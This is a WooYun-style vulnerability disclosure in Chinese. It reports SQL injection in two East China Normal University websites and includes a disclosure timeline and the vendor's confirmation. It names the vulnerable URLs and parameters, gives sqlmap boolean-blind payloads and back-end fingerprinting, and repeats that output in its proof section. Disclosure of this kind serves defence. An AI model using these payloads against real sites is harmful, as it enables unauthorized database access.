wybug_title: 华东师范大学两分站爆SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-12-28：	细节已通知厂商并且等待厂商处理中									2015-12-30：	厂商已经确认，细节仅向厂商公开									2016-01-09：	细节向核心白帽子及相关领域专家公开									2016-01-19：	细节向普通白帽子公开									2016-01-29：	细节向实习白帽子公开									2016-02-12：	细节向公众公开  简要描述： 1)华东师范大学外语学院2)《物理教学杂志》 详细说明：  1)华东师范大学外语学院http://www.flold.ecnu.edu.cn/ywgk/infoList.asp?cid=1
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: cid (GET)    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: cid=IIF(6448=6448,1,1/0)---[10:24:13] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access


2)《物理教学杂志》http://wljx.ecnu.edu.cn/Info.asp?id=1035
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 77 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1035 AND 3181=3181---[11:33:11] [INFO] testing MySQL[11:33:24] [WARNING] the back-end DBMS is not MySQL[11:33:24] [INFO] testing Oracle[11:33:25] [WARNING] the back-end DBMS is not Oracle[11:33:25] [INFO] testing PostgreSQL[11:33:26] [WARNING] the back-end DBMS is not PostgreSQL[11:33:26] [INFO] testing Microsoft SQL Server[11:33:28] [INFO] confirming Microsoft SQL Server[11:33:33] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2008




26个数据库。

   漏洞证明：  1)华东师范大学外语学院http://www.flold.ecnu.edu.cn/ywgk/infoList.asp?cid=1
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: cid (GET)    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: cid=IIF(6448=6448,1,1/0)---[10:24:13] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access


2)《物理教学杂志》http://wljx.ecnu.edu.cn/Info.asp?id=1035
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 77 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1035 AND 3181=3181---[11:33:11] [INFO] testing MySQL[11:33:24] [WARNING] the back-end DBMS is not MySQL[11:33:24] [INFO] testing Oracle[11:33:25] [WARNING] the back-end DBMS is not Oracle[11:33:25] [INFO] testing PostgreSQL[11:33:26] [WARNING] the back-end DBMS is not PostgreSQL[11:33:26] [INFO] testing Microsoft SQL Server[11:33:28] [INFO] confirming Microsoft SQL Server[11:33:33] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2008




26个数据库。

   修复方案：  你们更专业。   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-30 09:59 厂商回复： 通知二级单位处理。 最新状态： 暂无
